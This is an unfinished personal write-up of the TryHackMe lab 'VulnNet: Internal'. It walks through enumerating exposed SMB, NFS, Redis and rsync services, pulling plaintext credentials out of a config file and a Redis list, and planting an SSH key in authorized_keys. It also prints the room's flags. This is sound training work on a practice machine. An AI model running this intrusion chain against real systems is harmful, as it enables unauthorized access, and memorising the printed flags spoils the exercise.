March 8, 2025<br>
Day 306<br>

<h2>VulNet: Internal, In Progress (75%)</h2>
<p>VulnNet Entertainment learns from its mistakes, and now they have something new for you...</p>

<br>

<p align="center"> <img width="150px" src="https://github.com/user-attachments/assets/c1ab371a-4641-4eef-bda1-f64199f9ef90"> </p>

<br>

<h2>Task 1. VulnNet: Internal</h2>

<p>VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings.
- Difficulty: Easy/Medium<br>
- Operating System: Linux<br><br>
This machine was designed to be quite the opposite of the previous machines in this series and it focuses on internal services. It's supposed to show you how you can retrieve interesting information and use it to gain system access. Report your findings by submitting the correct flags.<br>

Note: It might take 3-5 minutes for all the services to boot.<br>

Icon made by Freepik from www.flaticon.com</p>

<br>

<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h4>
<br>

> 1.1. <em>What is the services flag? (services.txt) Hint : It's stored inside one of the available services.</em><br><a id='1.1'></a>
>> <code><strong>THM{0a09d51e488f5fa105d8d866a497440a}</strong></code>

<br>

```bash
:~/VulnNetInternal# echo 'Target_IP vulnet-internal' >> /etc/hosts
```

<br>

<p>Ran <code>nmap</code>, and discovered 13 ports open.<br>
- 22,ssh<br>
- 111,rpcbind<br>
- 139, netbios-ssn  Samba smdb 3.X - 4.X<br>
- 445, netbios-ssn  Samba smbd 4.7.6-Ubuntu<br>
- 873, rsync<br>
- 2049, nfs_acl<br>
- 6379, redis<br>
- 9090, filtered zeus-admin<br>
- 35809, javarmi<br>
- 42219, mountd<br>
- 42601, nlockmgr<br>
- 52497, mountd<br>
- 57289, mountd<br>
<br>

```bash
~/VulnNetInternal# nmap -sC -sV -sS -A -O -p- -T5 vulnet-internal
...
Not shown: 65522 closed ports
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
111/tcp   open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38446/udp6  mountd
|   100005  1,2,3      49481/udp   mountd
|   100005  1,2,3      57289/tcp   mountd
|   100005  1,2,3      58541/tcp6  mountd
|   100021  1,3,4      32872/udp6  nlockmgr
|   100021  1,3,4      38379/tcp6  nlockmgr
|   100021  1,3,4      42601/tcp   nlockmgr
|   100021  1,3,4      51039/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs_acl     3 (RPC #100227)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
35809/tcp open     java-rmi    Java RMI
42219/tcp open     mountd      1-3 (RPC #100005)
42601/tcp open     nlockmgr    1-4 (RPC #100021)
52497/tcp open     mountd      1-3 (RPC #100005)
57289/tcp open     mountd      1-3 (RPC #100005)
MAC Address: 02:D1:FA:78:C8:91 (Unknown)
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2025-03-08T18:35:52+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-08T17:35:52
|_  start_date: N/A
...
```
<br>

<p>Used <code>smbclient</code> to enumerate <code>Samba</code>.<br>
Used <code>mget</code> to donwload <code>services.txt</code>, <code>data.txt</code>, and <code>business-req.txt</code>.</p>

```bash
:~/VulnNetInternal# smbclient -N //Target_IP/shares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 09:20:09 2021
  ..                                  D        0  Tue Feb  2 09:28:11 2021
  temp                                D        0  Sat Feb  6 11:45:10 2021
  data                                D        0  Tue Feb  2 09:27:33 2021

		11309648 blocks of size 1024. 3275808 blocks available
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 11:45:10 2021
  ..                                  D        0  Tue Feb  2 09:20:09 2021
  services.txt                        N       38  Sat Feb  6 11:45:09 2021

		11309648 blocks of size 1024. 3275808 blocks available
smb: \temp\> mget services.txt
Get file services.txt? y
getting file \temp\services.txt of size 38 as services.txt (12.4 KiloBytes/sec) (average 12.4 KiloBytes/sec)
smb: \temp\> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 09:20:09 2021
  ..                                  D        0  Tue Feb  2 09:28:11 2021
  temp                                D        0  Sat Feb  6 11:45:10 2021
  data                                D        0  Tue Feb  2 09:27:33 2021

		11309648 blocks of size 1024. 3275808 blocks available
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 09:27:33 2021
  ..                                  D        0  Tue Feb  2 09:20:09 2021
  data.txt                            N       48  Tue Feb  2 09:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 09:27:33 2021

		11309648 blocks of size 1024. 3275808 blocks available
smb: \data\> mget *
Get file data.txt? y
getting file \data\data.txt of size 48 as data.txt (23.4 KiloBytes/sec) (average 16.8 KiloBytes/sec)
Get file business-req.txt? y
getting file \data\business-req.txt of size 190 as business-req.txt (2.9 KiloBytes/sec) (average 3.9 KiloBytes/sec)
smb: \data\> 

```

<br>

> 1.2. <em>What is the internal flag? ("internal flag") Hint : It's stored inside a database of one of the services.</em><br><a id='1.2'></a>
>> <code><strong>THM{ff8e518addbbddb74531a724236a8221}</strong></code>

<br>

<p>Used <code>cat</code> to visualize the content of <code>business-req.txt</code>, and for <code>data.txt</code> ... discovered that <code>we\u2019re waiting for the DOCUMENT you agreed to send us</code>.</p>

```bash
:~/VulnNetInternal# cat data.txt
Purge regularly data that is not needed anymore
:~/VulnNetInternal# cat business-req.txt
We just wanted to remind you that we\u2019re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
:~/VulnNetInternal#
```

<p>Mounted a remote directory because in <code>nmap</code> we identified that the <code>target</code> has <code>mountd</code> open ports.</p>

<p><code>showmount -e</code></p>

```bash
:~/VulnNetInternal# showmount -e vulnet-internal
Export list for vulnet-internal:
/opt/conf *
:~/VulnNetInternal# 
```

<p>Explored <code>nfs_acl (NFS share)</code>: port 2049<br>
Discovered <code>redis.conf</code></p>

```bash
:~/VulnNetInternal# mkdir tmp/
:~/VulnNetInternal# sudo mount -t nfs 10.10.243.254: tmp
```

<br>

![image](https://github.com/user-attachments/assets/16f409a4-c98a-4351-9b04-cbb6396c7759)

<br>
<p>Discovered <code>redis.conf</code>.</p>

```bash
:~/VulnNetInternal# sudo mount -t nfs Target_IP: mount
:~/VulnNetInternal# cd mount
:~/VulnNetInternal/mount# dir
opt
:~/VulnNetInternal/mount# cd opt
:~/VulnNetInternal/mount/opt# dir
conf
:~/VulnNetInternal/mount/opt# cd conf
:~/VulnNetInternal/mount/opt/conf# dir
hp  init  opt  profile.d  redis  vim  wildmidi
~/VulnNetInternal/mount/opt/conf/redis# ls
redis.conf
:~/VulnNetInternal/mount/opt/conf/redis# 
```

<p>Explored <code>redis</code>: port 6379.</p>

```bash
~/VulnNetInternal/mount/opt/conf/redis# cat redis.conf | more
...
rename-command FLUSHDB ""
rename-command FLUSHALL ""
...
# IF YOU ARE SURE YOU WANT YOUR INSTANCE TO LISTEN TO ALL THE INTERFACES
# JUST COMMENT THE FOLLOWING LINE.
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bind 127.0.0.1 ::1
...
protected-mode yes
...
port 6379
...
tcp-backlog 511
...
# Close the connection after a client is idle for N seconds (0 to disable)
timeout 0
...
# TCP keepalive.
...
tcp-keepalive 300
...
# If a pid file is specified, Redis writes it where specified at startup
# and removes it at exit.
...
pidfile /var/run/redis/redis-server.pid
...
loglevel notice
...
# Set the number of databases. The default database is DB 0, you can select
# a different one on a per-connection basis using SELECT <dbid> where
# dbid is a number between 0 and 'databases'-1
databases 16
...
always-show-logo yes
....
#   save ""

save 900 1
save 300 10
save 60 10000

...
stop-writes-on-bgsave-error yes
...
rdbcompression yes
...
rdbchecksum yes

# The filename where to dump the DB
dbfilename dump.rdb
...
# Note that you must specify a directory here, not a file name.
dir /var/lib/redis
...
slave-serve-stale-data yes

requirepass "B65Hx562F@ggAZ@F"
...
slave-read-only yes
...
lazyfree-lazy-eviction no
lazyfree-lazy-expire no
lazyfree-lazy-server-del no
slave-lazy-flush no
...
# Please check http://redis.io/topics/persistence for more information.

appendonly no

# The name of the append only file (default: "appendonly.aof")

appendfilename "appendonly.aof"
...
```

<p>- Discovered a password.</p>

```bash
:~/VulnNetInternal# sudo apt-get install redis-tools
...
:~/VulnNetInternal# redis-cli -h Target_IP -a 'B65Hx562F@ggAZ@F'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
Target_IP:6379> KEYS *
1) "marketlist"
2) "int"
3) "internal flag"
4) "tmp"
5) "authlist"
Target_IP:6379> KEYS "internal flag"
1) "internal flag"
Target_IP:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
```

<br>

> 1.3. <em>What is the user flag? (user.txt)</em><br><a id='1.3'></a>
>> <code><strong>THM{da7c20696831f253e0afaca8b83c07ab}</strong></code>

<p>Used redis´ <code>LRANGE</code> command.<br>
<code>LRANGE</code> command returns the specified elements of the list stores at the key. The offsets start and stop are zero-based indexes, with 0 being the first element of the list (the head of the list), 1 being the next element, and so on.  These offsets can also be negative numbers indicating offsets starting at the end of the list. For example, -1 is the last element of the list, -2 the penultimate, and so on.</p>

```bash
Target_IP:6379> LRANGE authlist 1 100
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
Target_IP:6379> 
```

<p>Decode it, and discovered location, and credentials.</p>

```bash
~/VulnNetInternal# echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
:~/VulnNetInternal# 
```

<p>Explored <code>rsync</code>: port 873.</p>

```bash
~/VulnNetInternal# rsync --list-only rsync://rsync-connect@Target_IP:873/files
Password: 
drwxr-xr-x          4,096 2021/02/01 12:51:14 .
drwxr-xr-x          4,096 2021/02/06 12:49:29 sys-internal
~/VulnNetInternal# rsync --list-only rsync://rsync-connect@Target_IP:873/files/sys-internal/
Password: 
drwxr-xr-x          4,096 2021/02/06 12:49:29 .
-rw-------             61 2021/02/06 12:49:28 .Xauthority
lrwxrwxrwx              9 2021/02/01 13:33:19 .bash_history
-rw-r--r--            220 2021/02/01 12:51:14 .bash_logout
-rw-r--r--          3,771 2021/02/01 12:51:14 .bashrc
-rw-r--r--             26 2021/02/01 12:53:18 .dmrc
-rw-r--r--            807 2021/02/01 12:51:14 .profile
lrwxrwxrwx              9 2021/02/02 14:12:29 .rediscli_history
-rw-r--r--              0 2021/02/01 12:54:03 .sudo_as_admin_successful
-rw-r--r--             14 2018/02/12 19:09:01 .xscreensaver
-rw-------          2,546 2021/02/06 12:49:35 .xsession-errors
-rw-------          2,546 2021/02/06 11:40:13 .xsession-errors.old
-rw-------             38 2021/02/06 11:54:25 user.txt
drwxrwxr-x          4,096 2021/02/02 09:23:00 .cache
drwxrwxr-x          4,096 2021/02/01 12:53:57 .config
drwx------          4,096 2021/02/01 12:53:19 .dbus
drwx------          4,096 2021/02/01 12:53:18 .gnupg
drwxrwxr-x          4,096 2021/02/01 12:53:22 .local
drwx------          4,096 2021/02/01 13:37:15 .mozilla
drwxrwxr-x          4,096 2021/02/06 11:43:14 .ssh
drwx------          4,096 2021/02/02 11:16:16 .thumbnails
drwx------          4,096 2021/02/01 12:53:21 Desktop
drwxr-xr-x          4,096 2021/02/01 12:53:22 Documents
drwxr-xr-x          4,096 2021/02/01 13:46:46 Downloads
drwxr-xr-x          4,096 2021/02/01 12:53:22 Music
drwxr-xr-x          4,096 2021/02/01 12:53:22 Pictures
drwxr-xr-x          4,096 2021/02/01 12:53:22 Public
drwxr-xr-x          4,096 2021/02/01 12:53:22 Templates
drwxr-xr-x          4,096 2021/02/01 12:53:22 Videos
~/VulnNetInternal#
~/VulnNetInternal# rsync authorized_keys rsync://rsync-connect@Target_IP/files/sys-internal/.ssh/
Password: 
drwxrwxr-x          4,096 2021/02/06 11:43:14 .
...
~/VulnNetInternal# ls
files
:~/VulnNetInternal# cd files
:~/VulnNetInternal/files# dir
sys-internal
:~/VulnNetInternal/files# cd sys-internal
:~/VulnNetInternal/files/sys-internal# dir
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  user.txt  Videos
:~/VulnNetInternal/files/sys-internal# cat user.txt
THM{da7c20696831f253e0afaca8b83c07ab}
:~/VulnNetInternal/files/sys-internal# 
```

<br>

> 1.4. <em>What is the root flag? (root.txt)</em><br><a id='1.4'></a>
>> <code><strong>____________________________________</strong></code>

<p>Discovered that we have read, write, and execute permission in <code>sys-internal/.ssh</code></p>

```bash
:~/VulnNetInternal/files/sys-internal# ls -la
total 108
drwxr-xr-x 18 ubuntu ubuntu 4096 Feb  6  2021 .
drwxr-xr-x  3 root   root   4096 Feb  1  2021 ..
lrwxrwxrwx  1 root   root      9 Feb  1  2021 .bash_history -> /dev/null
-rw-r--r--  1 ubuntu ubuntu  220 Feb  1  2021 .bash_logout
-rw-r--r--  1 ubuntu ubuntu 3771 Feb  1  2021 .bashrc
drwxrwxr-x  8 ubuntu ubuntu 4096 Feb  2  2021 .cache
drwxrwxr-x 14 ubuntu ubuntu 4096 Feb  1  2021 .config
drwx------  3 ubuntu ubuntu 4096 Feb  1  2021 .dbus
drwx------  2 ubuntu ubuntu 4096 Feb  1  2021 Desktop
-rw-r--r--  1 ubuntu ubuntu   26 Feb  1  2021 .dmrc
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Documents
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Downloads
drwx------  3 ubuntu ubuntu 4096 Feb  1  2021 .gnupg
drwxrwxr-x  3 ubuntu ubuntu 4096 Feb  1  2021 .local
drwx------  5 ubuntu ubuntu 4096 Feb  1  2021 .mozilla
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Music
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Pictures
-rw-r--r--  1 ubuntu ubuntu  807 Feb  1  2021 .profile
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Public
lrwxrwxrwx  1 root   root      9 Feb  2  2021 .rediscli_history -> /dev/null
drwxrwxr-x  2 ubuntu ubuntu 4096 Feb  6  2021 .ssh
-rw-r--r--  1 ubuntu ubuntu    0 Feb  1  2021 .sudo_as_admin_successful
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Templates
drwx------  4 ubuntu ubuntu 4096 Feb  2  2021 .thumbnails
-rw-------  1 ubuntu ubuntu   38 Feb  6  2021 user.txt
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Videos
-rw-------  1 ubuntu ubuntu   61 Feb  6  2021 .Xauthority
-rw-r--r--  1 ubuntu ubuntu   14 Feb 12  2018 .xscreensaver
-rw-------  1 ubuntu ubuntu 2546 Feb  6  2021 .xsession-errors
-rw-------  1 ubuntu ubuntu 2546 Feb  6  2021 .xsession-errors.old
:~/VulnNetInternal/files/sys-internal# 
```


<p>Generated <code>VulnNetInternalRSA</code> and <code>VulnNetInternalRSA.pub</code>.</p>

```bash
:~/VulnNetInternal/files/sys-internal/.ssh# ssh-keygen -f VulnNetInternalRSA
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in VulnNetInternalRSA
Your public key has been saved in VulnNetInternalRSA.pub
The key fingerprint is:
SHA256:[ Redacted ] [ Redacted ]
The key's randomart image is:
+---[RSA 3072]----+
|          . ...==|
|         . +..=.*|
|          * ...+=|
|         + = ..o+|
|        S = . ..E|
|       o O    ..*|
|        * .  o +B|
|       . o  . +.*|
|             .o*o|
+----[SHA256]-----+
```

<p>Created <code>authorized_keys</code>.</p>

```bash
:~/VulnNetInternal/files/sys-internal/.ssh# touch authorized_keys
```

<p>Stored <code>VulnNetInternalRSA.pub</code> in <code>authorized_keys</code>.</p>

```bash
:~/VulnNetInternal/files/sys-internal/.ssh# cat VulnNetInternalRSA.pub > authorized_keys
```

<p>Provided user read, write, and execute permissions.</p> 

```bash
:~/VulnNetInternal/files/sys-internal/.ssh# chmod 700 authorized_keys
```

<p>Used <code>rsync</code> again.</p>

```bash
~/VulnNetInternal/files/sys-internal# rsync -av ~/VulnNetInternal/files/sys-internal/.ssh/authorized_keys rsync://rsync-connect@Target_IP:873/files/sys-internal/.ssh
```


<h2> To be continued ...</h2>

<br>
<br>

<h2>My journey on TryHackMe</h2>

```
306 days streak 🎉 ▪ 85,747 points ▪ 607 rooms completed ▪ 59 badges🎖️
Global ranking:    365ᵗʰ all time    ▪    391st monthly
Brazil ranking:      8ᵗʰ all time    ▪      7ᵗʰ monthly
```

<br>

<p>Global all time ranking: 365ⁿᵈ</p>

![image](https://github.com/user-attachments/assets/21bf4b51-b144-41fb-bcbe-2399270a70ee)

<br>

<p>Brazil all time ranking: 8ᵗʰ</p>

![image](https://github.com/user-attachments/assets/95ae7958-50e4-4010-b08e-acbaee957d0e)

<br>

<p>Global monthly ranking: 391st</p>

![image](https://github.com/user-attachments/assets/cddde77c-3fc2-4de1-aca4-8e3c0a90cf73)

<br>

<p>Brazil monthly ranking: 7ᵗʰ</p>

![image](https://github.com/user-attachments/assets/7997d7c7-d2ca-4a5c-bbff-c0e1fed77781)

